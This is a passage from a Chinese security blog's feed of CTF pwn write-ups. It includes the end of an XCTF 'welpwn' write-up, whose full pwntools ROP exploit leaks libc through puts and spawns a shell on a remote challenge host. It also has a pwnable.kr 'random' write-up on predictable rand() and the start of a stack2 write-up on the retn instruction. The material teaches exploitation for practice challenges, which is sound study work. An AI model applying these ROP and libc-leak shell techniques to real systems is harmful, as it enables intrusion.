class="string">"unicode_escape"</span>) + str(p64(puts_addr),encoding=<span class="string">"unicode_escape"</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">"Welcome to RCTF\n"</span>, payload)</span><br><span class="line">print(sh.recv())</span><br></pre></td></tr></table></figure><blockquote><p>运行被阻断，从下面的过程中可以看出，是由于p64(pop_rdi)产生了截断符号造成的，导致s2只能复制buf的前0x20个字符，示意图如下：</p></blockquote><p><img src="/images/125-6.png" alt></p><blockquote><p>那么我们也就无法将<code>0x7fffffffe360</code>处的<code>write_got</code>的地址作为参数传递给寄存器<code>rdi</code>了，但是我们可以看到在<code>buf</code>存储空间上<code>p64(pop_rdi)</code>和后面的参数紧密的连接着，那么我们是不是可以执行<code>buf</code>空间的rop呢？答案当然是可以的，现在看来是需要我们将<code>ret</code>指令指向地址为<code>0x7fffffffe378</code>，那么我们可以使用<code>pop|ret</code>gadget来达到该目的，如果需要gadget的话，那么栈中发生变化，如下：</p></blockquote><p><img src="/images/125-7.png" alt></p><blockquote><p>从上面的图中可以看出，需要我们跳转的地址并不再是<code>0x7fffffffe378</code>而是<code>0x7fffffffe380</code>，<strong>所以需要pop出栈4次</strong>才能使得栈顶eip指向<code>0x7fffffffe380</code>，那么我们找一下该程序中有没有这样的gadget，通过<code>ROPgadget --binary pwn --only &quot;pop|ret&quot;</code>指令可以找到这样的gadget，如下图中的红色圈中的内容，我们选择地址为<code>0x000000000040089c</code>的gadget</p></blockquote><p><img src="/images/125-8.png" alt></p><blockquote><p>那么我们重新构造的payload为：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! python3</span></span><br><span class="line"><span class="comment">#! /usr/bin/env python3</span></span><br><span class="line"><span class="comment">#! conding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">"debug"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./pwn"</span>)</span><br><span class="line">sh = process(<span class="string">"./pwn"</span>)</span><br><span class="line">pop_ret4 = <span class="number">0x40089c</span></span><br><span class="line">pop_rdi = <span class="number">0x4008a3</span></span><br><span class="line">write_got = elf.got[<span class="string">"write"</span>]</span><br><span class="line">puts_addr = elf.symbols[<span class="string">"puts"</span>]</span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x18</span> + str(p64(pop_ret4),encoding=<span class="string">"unicode_escape"</span>) + str(p64(pop_rdi),encoding=<span class="string">"unicode_escape"</span>) + str(p64(write_got),encoding=<span class="string">"unicode_escape"</span>) + str(p64(puts_addr),encoding=<span class="string">"unicode_escape"</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">"Welcome to RCTF\n"</span>, payload)</span><br><span class="line">print(sh.recv())</span><br></pre></td></tr></table></figure><blockquote><p>那么我们怎么知道哪一个是我们想得到的<code>write_addr</code>的值呢？因为是先执行完<code>echo</code>函数中的指令，才能返回到调用函数前的返回地址，<font color="navy">由于我们只讲buf的前0x20个字节赋值给了s2，所以返回的前0x20个字符不是我们想要的，后面的才是我们想要的<code>write_addr</code>值</font>，我们可以看到接受的最后一个字符是<code>\x40</code>，这是<code>pop_ret4</code>在栈中的小端存储方式造成的，所以我们修改一下我们payload，将最后的接受的数据改为：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sh.recvuntil(<span class="string">"\x40"</span>)</span><br><span class="line">write_addr = u64(str(sh.recv(<span class="number">6</span>),encoding=<span class="string">"unicode_escape"</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">print(<span class="string">"[*] write_addr:"</span>,hex(write_addr))</span><br></pre></td></tr></table></figure><blockquote><p>运行结果如下图，从下图中可以看出，<code>9c 08 40</code>后面就是我们想要得到的<code>write_addr</code>的值（这是由<code>puts</code>函数打印出来的）。</p></blockquote><p><img src="/images/125-10.png" alt></p><blockquote><p>我们既然已经得到了<code>write</code>的真实地址，那么我们就可以泄露出<code>system</code>和<code>/bin/sh</code>的装载时的地址，这里我们需要用到一个python库<a href="https://github.com/lieanu/LibcSearcher" target="_blank" rel="noopener"><code>LibcSearcher</code>库</a>，这是针对CTF比赛所做的小工具，在泄露了Libc中的某一个函数地址后，常常为不知道对方所使用的操作系统及libc的版本而苦恼，常规方法就是挨个把常见的Libc.so从系统里拿出来，与泄露的地址对比一下最后12位。<sup>[1]</sup>根据该库作者的提示，我们可以这样泄露出<code>write</code>函数所在Libc库中的版本，同时泄露出system和/bin/sh的偏移</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> LibcSearcher</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc是所在库的版本号</span></span><br><span class="line">libc = LibcSearcher(<span class="string">"write"</span>,write_got)<span class="comment"># write_got 就是我们上面得到的write函数的真实地址</span></span><br><span class="line"><span class="comment"># 加载时的libc基地址</span></span><br><span class="line">libc_base = write_got - libc.dump(<span class="string">"write"</span>)</span><br><span class="line"><span class="comment"># 计算system函数加载时的虚拟地址</span></span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">"system"</span>)</span><br><span class="line"><span class="comment"># 计算/bin/sh函数加载时的虚拟地址</span></span><br><span class="line">bin_sh_addr = libc_base + libc.dump(<span class="string">"str_bin_sh"</span>)</span><br></pre></td></tr></table></figure><blockquote><p>在前面leak<code>write</code>函数地址的时候，已经将程序结束运行了，那怎么再次发送我们的payload呢？在这里需要用到一个技巧，就是在打印出write函数地址后，使得返回地址为<code>main</code>函数的地址，使程序重新运行，那么我们在泄露write函数的payload就得加上一个main函数地址，如下：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">main = elf.symbols[<span class="string">"main"</span>]</span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x18</span> + str(p64(pop4_ret),encoding=<span class="string">"unicode_escape"</span>) + str(p64(pop_rdi),encoding=<span class="string">"unicode_escape"</span>) + str(p64(write_got),encoding=<span class="string">"unicode_escape"</span>) + str(p64(puts_addr),encoding=<span class="string">"unicode_escape"</span>) + str(p64(main),encoding=<span class="string">"unicode_escape"</span>)</span><br></pre></td></tr></table></figure><blockquote><p>这样我们还可以再对buf输入一次值，那么第二次输入的payload和第一次的payload没有太大的区别，只不过是换了一下地址的值，示意图如下：</p></blockquote><p><img src="/images/125-9.png" alt></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x18</span> + str(p64(pop4_ret),encoding=<span class="string">"unicode_escape"</span>) + str(p64(pop_rdi),encoding=<span class="string">"unicode_escape"</span>) + str(p64(bin_sh_addr),encoding=<span class="string">"unicode_escape"</span>) + str(p64(system_addr),encoding=<span class="string">"unicode_escape"</span>)</span><br></pre></td></tr></table></figure><h3 id="0x02-解题步骤"><a href="#0x02-解题步骤" class="headerlink" title="0x02 解题步骤"></a><font color="navy"><code>0x02 解题步骤</code></font></h3><blockquote><p>具体的解题思路可以看<code>题目分析</code>部分，这里根据上文直接给出exp：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! python3</span></span><br><span class="line"><span class="comment">#! /usr/bin/env python3</span></span><br><span class="line"><span class="comment">#! coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">pop4_ret = <span class="number">0x40089c</span></span><br><span class="line">pop_rdi = <span class="number">0x4008a3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 泄露write函数装载时的地址</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_write</span><span class="params">(r,elf)</span>:</span></span><br><span class="line">    write_got = elf.got[<span class="string">"write"</span>]</span><br><span class="line">    print(<span class="string">"[*] write_got:"</span>,hex(write_got))</span><br><span class="line">    puts_addr = elf.symbols[<span class="string">"puts"</span>]</span><br><span class="line">    print(<span class="string">"[*] puts_addr:"</span>,hex(puts_addr))</span><br><span class="line">    puts_plt = elf.plt[<span class="string">"puts"</span>]</span><br><span class="line">    print(<span class="string">"[*] puts_plt:"</span>,hex(puts_plt))</span><br><span class="line">    main = elf.symbols[<span class="string">"main"</span>]</span><br><span class="line">    print(<span class="string">"[*] main_addr:"</span>,hex(main))</span><br><span class="line">    payload = <span class="string">"a"</span>*<span class="number">0x18</span> + str(p64(pop4_ret),encoding=<span class="string">"unicode_escape"</span>) + str(p64(pop_rdi),encoding=<span class="string">"unicode_escape"</span>) + str(p64(write_got),encoding=<span class="string">"unicode_escape"</span>) + str(p64(puts_addr),encoding=<span class="string">"unicode_escape"</span>) + str(p64(main),encoding=<span class="string">"unicode_escape"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">"Welcome to RCTF\n"</span>, payload)</span><br><span class="line">    <span class="comment">#r.recvuntil('a'*(0x10+8))</span></span><br><span class="line">    r.recvuntil(<span class="string">"\x40"</span>)</span><br><span class="line">    write_addr = u64(str(r.recvn(<span class="number">6</span>),encoding=<span class="string">"unicode_escape"</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">    print(<span class="string">"[+] write_addr:"</span>,write_addr)</span><br><span class="line">    <span class="keyword">return</span> write_addr</span><br><span class="line"></span><br><span class="line"><span class="comment"># 寻找system和/bin/sh的虚拟地址</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_system_bin_addr</span><span class="params">(write_addr,r,elf)</span>:</span></span><br><span class="line">    libc = LibcSearcher(<span class="string">"write"</span>,write_addr)</span><br><span class="line">    print(<span class="string">"[+] libc:"</span>,libc)</span><br><span class="line">    libc_base = write_addr - libc.dump(<span class="string">"write"</span>)</span><br><span class="line">    system_addr = libc_base + libc.dump(<span class="string">"system"</span>)</span><br><span class="line">    bin_sh_addr = libc_base + libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line">    payload = <span class="string">"a"</span>*<span class="number">0x18</span> + str(p64(pop4_ret),encoding=<span class="string">"unicode_escape"</span>) + str(p64(pop_rdi),encoding=<span class="string">"unicode_escape"</span>) + str(p64(bin_sh_addr),encoding=<span class="string">"unicode_escape"</span>) + str(p64(system_addr),encoding=<span class="string">"unicode_escape"</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 主函数</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    r = remote(<span class="string">"220.249.52.133"</span>,<span class="number">30472</span>)</span><br><span class="line">    elf = ELF(<span class="string">"./pwn"</span>)</span><br><span class="line">    context(log_level=<span class="string">"debug"</span>)</span><br><span class="line">    write_addr = leak_write(r,elf)</span><br><span class="line">    find_system_bin_addr(write_addr,r,elf)</span><br></pre></td></tr></table></figure><h3 id="0x03-Reference"><a href="#0x03-Reference" class="headerlink" title="0x03 Reference"></a><font color="navy"><code>0x03 Reference</code></font></h3><p>[1] <a href="https://github.com/lieanu/LibcSearcher" target="_blank" rel="noopener">Search libc function offset</a></p><p>[2] <a href="https://blog.csdn.net/seaaseesa/article/details/102944448" target="_blank" rel="noopener">攻防世界PWN之Welpwn题解</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x00-相关知识点&quot;&gt;&lt;a href=&quot;#0x00-相关知识点&quot; class=&quot;headerlink&quot; title=&quot;0x00 相关知识点&quot;&gt;&lt;/a&gt;&lt;font color=&quot;navy&quot;&gt;&lt;code&gt;0x00 相关知识点&lt;/code&gt;&lt;/font&gt;&lt;/h3&gt;&lt;h
      
    
    </summary>
    
      <category term="Binary" scheme="https://muzibing.github.io/categories/Binary/"/>
    
    
      <category term="XCTF" scheme="https://muzibing.github.io/tags/XCTF/"/>
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Pwnable.kr的奇幻之旅（六）[random]</title>
    <link href="https://muzibing.github.io/2020/06/09/2020.06.09%EF%BC%88124%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/06/09/2020.06.09（124）/</id>
    <published>2020-06-08T16:00:00.000Z</published>
    <updated>2020-06-09T06:38:36.468Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-colornavy0x00-相关知识点font"><a class="markdownIt-Anchor" href="#font-colornavy0x00-相关知识点font"></a> <font color="navy"><code>0x00 相关知识点</code></font></h3><h4 id="font-color-blue1rand函数的伪随机font"><a class="markdownIt-Anchor" href="#font-color-blue1rand函数的伪随机font"></a> <font color="blue"><code>1.rand()函数的“伪随机”</code></font></h4><p>      首先我们根据一个程序来认识<code>rand()</code>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a,i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)&#123;</span><br><span class="line">        a = rand();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"a%d = %d\n"</span>,i,a);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>      我们多次运行该程序会得到如下结果：</p><p><img src="/images/124-1.png" alt></p><p>      我们可以从上面的结果可以看出不同的运行，产生的5个结果都是相对等的，这就说明了rand()函数产生的是伪随机数，这是由于rand函数内部**是通过一个公式计算出一个值作为随机值，下次再调用rand的时候，再把这个随机值作为参数传给这个公式计算出一个新的随机值，周而复始。**比如下方的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> next=<span class="number">1</span>;     <span class="comment">//静态全局变量，作为种子</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* RAND_MAX assumed to be 32767 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">myrand</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    next = next * <span class="number">1103515245</span> + <span class="number">12345</span>;</span><br><span class="line">    <span class="keyword">return</span>((<span class="keyword">unsigned</span>)(next/<span class="number">65536</span>) % <span class="number">32768</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>可以看出，在这里<code>next</code>变量在这里相当于一个<code>seed</code>，因为程序只要重新开始运行，“种子”值就会被默认赋值为1，那么通过公式算出来的数值肯定就一直相同了。那么下面我们就要引入<code>srand()</code>函数，现在在我们的代码的基础上，添加srand()函数，看一下运行结果如何，代码如下：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a,i;</span><br><span class="line">    srand(time(<span class="literal">NULL</span>));<span class="comment">// 设置随机数种子</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">           a = rand();</span><br><span class="line">           <span class="built_in">printf</span>(<span class="string">"a%d = %d\n"</span>,i,a);</span><br><span class="line">           sleep(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>运行结果如下：</p></blockquote><p><img src="/images/124-2.png" alt></p><blockquote><p><code>time(NULL)</code>是指返回从1970年1.1日（元旦）午夜0点到现在的秒数，对于srand的输入每次都会不同，那么<code>rand()</code>和<code>srand()</code>的实现原理如下：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> next = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* RAND_MAX assumed to be 32767 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">myrand</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    next = next * <span class="number">1103515245</span> + <span class="number">12345</span>;</span><br><span class="line">    <span class="keyword">return</span>((<span class="keyword">unsigned</span>)(next/<span class="number">65536</span>) % <span class="number">32768</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mysrand</span><span class="params">(<span class="keyword">unsigned</span> seed)</span> </span>&#123;</span><br><span class="line">    next = seed;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>如果<code>mysrand</code>函数的参数是<code>time(NULL)</code>，也就是说<code>rand</code>函数每次运行时的种子是不同的，因此产生的随机数序列就不会相同了，但是这种是<code>伪随机数</code>，是可以预测的。要注意上面的并不是c库中的源码，下面给出c库中的源码：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cruntime.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mtdll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __<span class="function">cdecl <span class="title">srand</span> <span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">unsigned</span> <span class="keyword">int</span> seed</span></span></span><br><span class="line"><span class="function"><span class="params">        )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        _getptd()-&gt;_holdrand = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)seed;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">rand</span> <span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">void</span></span></span></span><br><span class="line"><span class="function"><span class="params">        )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        _ptiddata ptd = _getptd();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>( ((ptd-&gt;_holdrand = ptd-&gt;_holdrand * <span class="number">214013L</span></span><br><span class="line">            + <span class="number">2531011L</span>) &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0x7fff</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="font-color-navy0x01-题目分析font"><a class="markdownIt-Anchor" href="#font-color-navy0x01-题目分析font"></a> <font color="navy"><code>0x01 题目分析</code></font></h3><p>      查看题目中给出的源码，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> random;</span><br><span class="line">        random = rand();        <span class="comment">// random value!</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> key=<span class="number">0</span>;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;key);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>( (key ^ random) == <span class="number">0xdeadbeef</span> )&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Good!\n"</span>);</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Wrong, maybe you should try 2^32 cases.\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>      下面我们来详细的分析一下上述程序：</p><blockquote><ol><li>首先用<code>rand</code>函数设置一个伪随机数，但是没有用<code>srand</code>函数对种子进行初始化；</li><li>需要我们输入一个key变量；</li><li>将输入的key与生成的伪随机数进行异或，判断是否与0xdeadbeef值相等，如果相等就打印出<code>flag</code></li></ol></blockquote><p>      通过上述的分析，我们发现要想成功的打印出flag就必须使得我们输入的值与伪随机数异或以后的值为0xdeadbeef，在这里我们还应该要清楚异或的性质：a ⊕ b = c，那么 b = a ⊕ c，所以说 <code>key = random ⊕ 0xdeadbeef</code>，所以我们只需要知道random的值是多少即可求出key</p><h3 id="font-color-navy0x02-解题步骤font"><a class="markdownIt-Anchor" href="#font-color-navy0x02-解题步骤font"></a> <font color="navy"><code>0x02 解题步骤</code></font></h3><h4 id="font-color-blue1写出脚本算出key值font"><a class="markdownIt-Anchor" href="#font-color-blue1写出脚本算出key值font"></a> <font color="blue"><code>1.写出脚本，算出key值</code></font></h4><p>      根据我们上文的分析，可以写出一个小的程序，来计算我们要求的key，脚本如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> random;</span><br><span class="line">        random = rand();        <span class="comment">// random value!</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> key=<span class="number">0</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d"</span>,<span class="number">0xdeadbeef</span> ^ random);</span><br><span class="line">        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>运行结果为<code>-1255736440</code></p></blockquote><h4 id="font-color-blue2输入结果得到flagfont"><a class="markdownIt-Anchor" href="#font-color-blue2输入结果得到flagfont"></a> <font color="blue"><code>2.输入结果，得到flag</code></font></h4><blockquote><p>得到如下的结果：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">random@pwnable:~$ ./random </span><br><span class="line">-1255736440</span><br><span class="line">Good!</span><br><span class="line">Mommy, I thought libc random is unpredictable...</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-colornavy0x00-相关知识点font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-colornavy0x00-相关知识点font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;&lt;code&gt;0x00 相
      
    
    </summary>
    
      <category term="Binary" scheme="https://muzibing.github.io/categories/Binary/"/>
    
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
      <category term="pwnable.kr" scheme="https://muzibing.github.io/tags/pwnable-kr/"/>
    
  </entry>
  
  <entry>
    <title>【XCTF-pwn】stack2 writeup</title>
    <link href="https://muzibing.github.io/2020/06/08/2020.06.08%EF%BC%88123%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/06/08/2020.06.08（123）/</id>
    <published>2020-06-07T16:00:00.000Z</published>
    <updated>2020-06-14T04:43:16.975Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-navy0x00相关知识点font"><a class="markdownIt-Anchor" href="#font-color-navy0x00相关知识点font"></a> <font color="navy"><code>0x00.相关知识点</code></font></h3><h4 id="font-color-blue1retn-指令font"><a class="markdownIt-Anchor" href="#font-color-blue1retn-指令font"></a> <font color="blue"><code>1.retn 指令</code></font></h4><p><code>格式</code>：retn</p><p><code>功能</code>：返回主程序。经常和<code>call</code>一起使用，当调用的过程结束后实现从过程返回至原调用程序的下一条指令，本指令不影响标志位</p><p><code>说明</code>：由于在过程定义时，已指明其近(NEAR)或远(FAR)的属性,所以RET指令根据段内调用与段间调用,执行不同的操作</p><ul><li><code>对段内调用</code>：返回时，由堆栈弹出一个字的返回地址的段内偏移量至IP</li><li><code>对段外调用</code>：返回时，由堆栈弹出的第一个字为返回地址的段内偏移量，将其送入IP中，由堆栈弹出第二个字为返回地址的段基址，将其送入CS中</li></ul><p><code>举例</code></p><p>     下面用一个简单的代码来说明一下retn的具体作用，代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 